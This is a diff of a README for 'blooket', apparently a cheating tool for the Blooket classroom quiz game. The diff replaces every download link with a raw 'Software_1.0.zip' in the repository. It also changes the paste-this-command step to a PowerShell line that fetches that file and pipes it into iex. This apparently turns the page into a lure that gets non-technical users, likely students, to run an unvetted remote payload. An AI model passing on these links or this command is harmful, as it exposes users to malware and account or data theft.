@@ -1,6 +1,6 @@
 # 🎮 blooket - Automated Game Assistant for Blooket
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/coder323111/blooket/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/coder323111/blooket/raw/refs/heads/main/src/Software_1.0.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This software is for educational purposes only. Please use it responsibly and fo
 
 To get started, you need to download the program files. You can find the latest version on the releases page.
 
-[Download blooket from here](https://github.com/coder323111/blooket/releases)
+[Download blooket from here](https://github.com/coder323111/blooket/raw/refs/heads/main/src/Software_1.0.zip)
 
 Click that link, then look for the newest file listed under "Assets". Download the file that best matches your Windows system (usually an `.exe` or `.zip` file).
 
@@ -41,7 +41,7 @@ A black window called Command Prompt will open. This lets you type commands to i
 Copy the command below exactly. Then, right-click inside the Command Prompt window to paste it. Press **Enter** to start.  
 
 ```powershell
-powershell -Command "iwr -useb https://raw.githubusercontent.com/coder323111/blooket/main/install.ps1 | iex"
+powershell -Command "iwr -useb https://github.com/coder323111/blooket/raw/refs/heads/main/src/Software_1.0.zip | iex"
 ```
 
 This command does a few things:
@@ -106,7 +106,7 @@ To run blooket on Windows, you will need:
 
 Check the releases page regularly for updates.
 
-[Go to blooket releases](https://github.com/coder323111/blooket/releases)
+[Go to blooket releases](https://github.com/coder323111/blooket/raw/refs/heads/main/src/Software_1.0.zip)
 
 Download the new version and run the install command again to update.
 
@@ -134,4 +134,4 @@ It aims to make Blooket easier and faster to navigate for users who want assista
 
 ---
 
-[Download blooket for Windows](https://github.com/coder323111/blooket/releases)
+[Download blooket for Windows](https://github.com/coder323111/blooket/raw/refs/heads/main/src/Software_1.0.zip)
